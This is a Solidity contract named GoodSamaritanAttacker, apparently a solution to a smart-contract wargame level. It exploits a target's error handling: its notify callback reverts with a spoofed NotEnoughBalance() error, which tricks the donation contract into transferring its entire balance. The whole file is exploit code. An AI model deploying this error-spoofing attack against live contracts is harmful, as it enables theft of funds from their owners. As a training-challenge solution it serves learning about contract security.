// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}
interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}
contract GoodSamaritanAttacker is INotifyable{
    address public goodSamaritanContract;

    error NotEnoughBalance();

    constructor(address _goodSamaritanContract){
        goodSamaritanContract = _goodSamaritanContract;
    }

    function notify(uint256 amount)  external{
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function requestForCoin() external {
        IGoodSamaritan(goodSamaritanContract).requestDonation();
    }

    function getErrorEncoded() external pure returns (bytes memory) {
        return abi.encodeWithSignature("NotEnoughBalance()");
    }
}